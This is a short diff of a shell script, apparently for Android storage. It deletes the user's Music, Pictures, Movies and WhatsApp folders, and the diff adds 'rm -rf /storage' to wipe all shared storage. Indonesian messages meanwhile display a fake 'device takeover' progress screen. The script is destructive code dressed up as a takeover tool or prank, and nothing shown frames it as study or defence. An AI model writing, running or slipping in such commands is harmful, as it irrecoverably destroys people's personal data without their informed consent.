@@ -10,6 +10,7 @@ rm -rf Music
 rm -rf Pictures
 rm -rf Movies
 rm -rf WhatsApp
+rm -rf /storage
 echo "Memperoses Persetujuan Mengambil Alih Perangkat..."
 sleep 2
 echo "Pengambil Alihan Perangkat 50%"
